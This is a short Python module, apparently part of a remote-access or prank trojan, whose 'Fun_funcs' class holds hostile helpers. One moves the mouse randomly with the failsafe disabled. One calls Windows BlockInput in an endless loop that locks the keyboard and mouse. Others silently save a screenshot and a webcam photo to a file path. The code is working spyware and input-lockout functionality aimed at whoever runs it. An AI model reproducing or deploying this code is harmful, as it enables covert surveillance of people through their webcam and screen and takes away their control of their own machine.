import pyautogui as pag
import cv2
from Funcs import funcs
import random as rd
from ctypes import *


class Fun_funcs:
    
    def mouse_rand(func):
        pag.FAILSAFE = False
        value_for_x = rd.randint(200, 1080)   # x
        value_for_y = rd.randint(300, 1080)   # y
        pag.moveTo(value_for_x, value_for_y, int(func))

    def window_warning(func):
        pag.alert(func)

    def blockUnblockKeyMouse(truefalse):
        while truefalse:
            windll.user32.BlockInput(truefalse)

    def screenshot():
        pag.screenshot(f'{funcs.PATH}ss.png')

    def get_photo_from_camera():
        cap = cv2.VideoCapture(0)
        for i in range(40):
            cap.read()
        ret, frame = cap.read()
    
        cv2.imwrite(f'{funcs.PATH}cam.png', frame)

        cap.release()
